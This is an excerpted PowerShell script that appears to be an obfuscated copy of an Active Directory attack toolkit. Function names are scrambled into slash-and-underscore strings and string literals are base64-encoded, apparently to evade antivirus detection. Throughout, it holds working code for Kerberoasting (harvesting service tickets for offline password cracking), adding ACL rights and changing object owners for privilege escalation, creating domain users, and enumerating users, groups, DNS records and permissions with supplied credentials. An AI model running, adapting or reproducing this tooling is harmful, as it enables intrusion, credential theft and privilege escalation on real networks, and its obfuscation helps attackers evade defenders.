...
function ___/===\_/===\/=== {
        ...
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ...
                if (-not $MappedComputers[$HostComputer]) {
                    _/=\____/\/=\_/=\/ -ComputerName $HostComputer -Credential $Credential
    ...
    END {
        $MappedComputers.Keys | _/==\___/\__/==\__
    }
}
    ...
    PROCESS {
        ForEach ($Object in $ObjectName) {
            ...
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                $DN = _/==\/\/=\____/\/= -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
                    ...
                    _/==\/=\_____/==== @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    ...
                    elseif (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        $DomainSearcherArguments = @{}
                        $Domain = (__/==\/\_/\/\__/\_ @DomainSearcherArguments).Name
                    }
        ...
        ForEach ($TargetSid in $ObjectSid) {
            ...
            try {
                Switch ($TargetSid) {
                    ...
                    Default {
                        _/==\/\/=\____/\/= -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
...
function _/==\/\/=\____/\/= {
    ...
    BEGIN {
        ...
        function _/==\/=\/\___/\/\_([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Null
        ...
        function __/\/=\/==\/\/=\_/([__ComObject] $Object, [String] $Property, $Parameters) {
    ...
    PROCESS {
        ForEach ($TargetIdentity in $Identity) {
            ...
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                try {
                    $Cred = $Credential.GetNetworkCredential()
                    _/==\/=\/\___/\/\_ $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABFAHgA'))) (
                        $ADSInitType,
                        $InitName,
                        $Cred.UserName,
                        $Cred.Domain,
                ...
                try {
                    $Null = _/==\/=\/\___/\/\_ $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdAA='))) (
                        $ADSInitType,
                        $InitName
                    )
                }
            ...
            __/\/=\/==\/\/=\_/ $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcwBlAFIAZQBmAGUAcgByAGEAbAA='))) (0x60)
            try {
                $Null = _/==\/=\/\___/\/\_ $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA'))) (8, $TargetIdentity)
                _/==\/=\/\___/\/\_ $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) ($ADSOutputType)
            }
    ...
    try {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] -or ($Identity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA'))))) {
            if ($Identity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                $ConvertedIdentity = $Identity | _/==\/\/=\____/\/= -OutputType Canonical
            ...
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcwBpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA==')))
                $DomainName = __/==\/\_/\/\__/\_ | Select-Object -ExpandProperty Name
...
function ___/===\/\__/\/\/\ {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $LogonToken = __/=\/=\_/\/=====\ -Credential $Credential
        }
    }
    PROCESS {
...
function Invoke-Kerberoast {
    ...
    PROCESS {
        ...
        __/\/\/=\_/======\ @UserSearcherArguments | Where-Object {$_.samaccountname -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA')))} | ___/===\/\__/\/\/\ -OutputFormat $OutputFormat
    }
    END {
        if ($LogonToken) {
            _/===\/\/=\/=\_/== -TokenHandle $LogonToken
        ...
        ForEach ($TargetPath in $Path) {
            try {
                ...
                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    ...
                    $Name = ________/=\_/==\__ -ObjectSID $SID @ConvertArguments
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) $TargetPath
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBTAHkAcwB0AGUAbQBSAGkAZwBoAHQAcwA='))) (_/====\__/\/\/=\_/ -FSR $_.FileSystemRights.value__)
...
function ____/==\/\_/\_/=\_ {
    ...
    PROCESS {
        ...
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $DomainObject = __/==\/\_/\/\__/\_ -Credential $Credential
...
function _/=\/\___/\_/\/\/\ {
    ...
    PROCESS {
        ...
        elseif ($RDataType -eq 2) {
            $NSName = ___/\_/\/\___/===\ $DNSRecord[24..$DNSRecord.length]
            $Data = $NSName
        ...
        elseif ($RDataType -eq 5) {
            $Alias = ___/\_/\/\___/===\ $DNSRecord[24..$DNSRecord.length]
            $Data = $Alias
        ...
        elseif ($RDataType -eq 12) {
            $Ptr = ___/\_/\/\___/===\ $DNSRecord[24..$DNSRecord.length]
            $Data = $Ptr
...
function Get-DomainDNSZone {
    ...
    PROCESS {
        ...
        $DNSSearcher1 = ____/==\/\_/\_/=\_ @SearcherArguments
        if ($DNSSearcher1) {
            ...
            $Results | Where-Object {$_} | ForEach-Object {
                $Out = __/\_/\/\__/\_/\/= -Properties $_.Properties
        ...
        $DNSSearcher2 = ____/==\/\_/\_/=\_ @SearcherArguments
        if ($DNSSearcher2) {
            try {
...
function Get-DomainDNSRecord {
    ...
    PROCESS {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $DNSSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
        if ($DNSSearcher) {
            ...
            $Results | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = __/\_/\/\__/\_/\/= -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    ...
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        $Record = _/=\/\___/\_/\/\/\ -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $Record = _/=\/\___/\_/\/\/\ -DNSRecord $Out.dnsrecord
                    }
                    if ($Record) {
...
function _____/\/\/===\/=\_ {
    ...
    PROCESS {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA=')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            ...
            ___/=\_/\___/=\/\_ @Arguments
        }
        else {
            $FoundDomain = __/==\/\_/\/\__/\_ @Arguments
            if ($FoundDomain) {
...
function ___/==\__/\_/=\_/\ {
    ...
    PROCESS {
        ...
        if ($ForestObject) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                $ForestSid = (__/\/\/=\_/======\ -Identity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                $ForestSid = (__/\/\/=\_/======\ -Identity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain $ForestObject.RootDomain.Name).objectsid
            }
...
function Get-ForestDomain {
    ...
    PROCESS {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $Arguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $ForestObject = ___/==\__/\_/=\_/\ @Arguments
        if ($ForestObject) {
...
function Find-DomainObjectPropertyOutlier {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                $TargetForest = __/==\/\_/\/\__/\_ -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $TargetForest = __/==\/\_/\/\__/\_ -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
    ...
    PROCESS {
        ...
        if (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))) -or ($ReferenceObjectClass -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))) {
            $Objects = __/\/\/=\_/======\ @SearcherArguments
        ...
        elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))) -or ($ReferenceObjectClass -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))))) {
            $Objects = ____/\/\___/\/==== @SearcherArguments
            if (-not $ReferenceObjectProperties) {
        ...
        elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA==')))) -or ($ReferenceObjectClass -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA=='))))) {
            $Objects = ___/=\_/\___/=\/\_ @SearcherArguments
            if (-not $ReferenceObjectProperties) {
...
function __/\/\/=\_/======\ {
    ...
    DynamicParam {
        ...
        __/\/\/==\/==\_/\/ -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $UserSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            __/\/\/==\/==\_/\/ -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                ...
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | _/==\/\/=\____/\/= -OutputType Canonical
            ...
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ...
                    $User = __/\_/\/\__/\_/\/= -Properties $_.Properties
...
function New-DomainUser {
    ...
    $Context = _/=\/=\_/\_____/\/ @ContextArguments
    if ($Context) {
...
function _________/=\/\/=== {
    ...
    try {
        $SchemaPath = (___/==\__/\_/=\_/\ @ForestArguments).schema.name
    }
    catch {
    ...
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    $SchemaSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
    if ($SchemaSearcher) {
        try {
    ...
    $RightsSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
    if ($RightsSearcher) {
        try {
...
function ___/=\_/\___/=\/\_ {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $CompSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            __/\/\/==\/==\_/\/ -CreateVariables -BoundParameters $PSBoundParameters
            ...
            $Results | Where-Object {$_} | ForEach-Object {
                ...
                if ($Up) {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ...
                        $Computer = __/\_/\/\__/\_/\/= -Properties $_.Properties
...
function _/==\/=\_____/==== {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $ObjectSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            __/\/\/==\/==\_/\/ -CreateVariables -BoundParameters $PSBoundParameters
        ...
        if ($ObjectSearcher) {
            ...
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ...
                    $Object = __/\_/\/\__/\_/\/= -Properties $_.Properties
...
function Get-DomainObjectAttributeHistory {
    ...
    PROCESS {
        ...
        _/==\/=\_____/==== @SearcherArguments | ForEach-Object {
...
function Set-DomainObject {
    ...
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        $RawObject = _/==\/=\_____/==== @SearcherArguments
...
function ConvertFrom-LDAPLogonHours {
    ...
    Process {
        $Output = @{
            Sunday = _/==\_/=\_/\___/== -HoursArr $LogonHoursArray[0..2]
            Monday = _/==\_/=\_/\___/== -HoursArr $LogonHoursArray[3..5]
            Tuesday = _/==\_/=\_/\___/== -HoursArr $LogonHoursArray[6..8]
            Wednesday = _/==\_/=\_/\___/== -HoursArr $LogonHoursArray[9..11]
            Thurs = _/==\_/=\_/\___/== -HoursArr $LogonHoursArray[12..14]
            Friday = _/==\_/=\_/\___/== -HoursArr $LogonHoursArray[15..17]
            Saturday = _/==\_/=\_/\___/== -HoursArr $LogonHoursArray[18..20]
        }
...
function New-ADObjectAccessControlEntry {
    ...
    Begin {
        if ($PrincipalIdentity -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
            ...
            $Principal = _/==\/=\_____/==== @PrincipalSearcherArguments
            if (-not $Principal) {
...
function Set-DomainObjectOwner {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $OwnerSid = _/==\/=\_____/==== @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
        if ($OwnerSid) {
...
function __/\/===\/\____/== {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $Searcher = ____/==\/\_/\_/=\_ @SearcherArguments
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) {
            $GUIDs = _________/=\/\/=== @DomainGUIDMapArguments
        }
    }
    PROCESS {
        if ($Searcher) {
...
function Add-DomainObjectAcl {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $Principals = _/==\/=\_____/==== @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }
    PROCESS {
        ...
        $Targets = _/==\/=\_____/==== @TargetSearcherArguments
...
function Find-InterestingDomainAcl {
    ...
    PROCESS {
        ...
        __/\/===\/\____/== @ACLArguments | ForEach-Object {
            if ( ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAB8AFcAcgBpAHQAZQB8AEMAcgBlAGEAdABlAHwARABlAGwAZQB0AGUA')))) -or (($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))) -and ($_.AceQualifier -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))))) {
                if ($_.SecurityIdentifier.Value -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAuACoALQBbADEALQA5AF0AXABkAHsAMwAsAH0AJAA=')))) {
                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                        ...
                        $IdentityReferenceDN = _/==\/\/=\____/\/= -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
                        if ($IdentityReferenceDN) {
                            ...
                            $Object = _/==\/=\_____/==== @ObjectSearcherArguments
                            if ($Object) {
...
function _/==\__/=\/====\/\ {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $OUSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
    }
    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter = ''
            ...
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ...
                    $OU = __/\_/\/\__/\_/\/= -Properties $_.Properties
                }
...
function _/=\/=\___/\/==\_/ {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $SiteSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
    }
    PROCESS {
        if ($SiteSearcher) {
            $IdentityFilter = ''
            ...
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ...
                    $Site = __/\_/\/\__/\_/\/= -Properties $_.Properties
                }
...
function Get-DomainSubnet {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $SubnetSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
    }
    PROCESS {
        if ($SubnetSearcher) {
            $IdentityFilter = ''
            ...
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ...
                    $Subnet = __/\_/\/\__/\_/\/= -Properties $_.Properties
                }
...
function ___/====\/\_/=\/== {
    ...
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    $DCSID = ___/=\_/\___/=\/\_ @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid
    if ($DCSID) {
...
function ____/\/\___/\/==== {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $GroupSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
    }
    PROCESS {
        if ($GroupSearcher) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIASQBkAGUAbgB0AGkAdAB5AA==')))]) {
                ...
                _/==\/=\_____/==== @SearcherArguments | ForEach-Object {
                    ...
                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
                        ...
                        if ($GroupSid -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAzADIALQAuACoA')))) {
                            ...
                            $Group = _/==\/=\_____/==== @SearcherArguments
                            if ($Group) {
                ...
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ...
                        $Group = __/\_/\/\__/\_/\/= -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                    $Group
                }
...
function Get-DomainManagedSecurityGroup {
    ...
    PROCESS {
        ...
        ____/\/\___/\/==== @SearcherArguments | ForEach-Object {
            ...
            $GroupManager = _/==\/=\_____/==== @SearcherArguments
    ...
    PROCESS {
        ...
        if ($GroupSearcher) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQBVAHMAaQBuAGcATQBhAHQAYwBoAGkAbgBnAFIAdQBsAGUA')))]) {
                $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
                $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                $Group = ____/\/\___/\/==== @SearcherArguments
                if (-not $Group) {
            ...
            ForEach ($Member in $Members) {
                ...
                if ($Properties) {
                    ...
                    try {
                        ...
                        if ($MemberDN -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBpAGcAbgBTAGUAYwB1AHIAaQB0AHkAUAByAGkAbgBjAGkAcABhAGwAcwB8AFMALQAxAC0ANQAtADIAMQA=')))) {
                            try {
                                ...
                                $MemberSimpleName = _/==\/\/=\____/\/= -Identity $MemberSID -OutputType $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA'))) @ADNameArguments
                                if ($MemberSimpleName) {
                    ...
                    if ($Properties.samaccountname) {
                        ...
                        try {
                            $MemberName = ________/=\_/==\__ -ObjectSID $Properties.cn[0] @ADNameArguments
                        }
                        catch {
...
